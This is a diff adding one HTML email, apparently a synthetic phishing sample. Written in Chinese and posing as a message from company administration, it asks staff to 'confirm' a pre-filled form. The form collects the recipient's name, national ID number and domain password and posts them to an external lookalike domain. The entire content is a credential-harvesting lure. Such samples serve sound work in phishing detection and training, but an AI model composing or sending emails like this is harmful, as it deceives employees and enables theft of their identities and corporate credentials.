@@ -1,0 +1,9 @@
+From: =?utf-8?B?6KGM5pS/?= <admin@corp-relay26.example>
+To: staff@corp.internal
+Date: Fri, 18 Sep 2026 09:12:00 +0800
+Message-ID: <0002-b25@synth.example>
+Subject: 个人信息表预填（确认）
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><form action='https://info-confirm26.example.info/s'><input name='name' value='（您的姓名）'><input name='idno' value='（身份证）'><input type='password' name='pwd' placeholder='域密码核验'><button>确认提交</button></form></body></html>
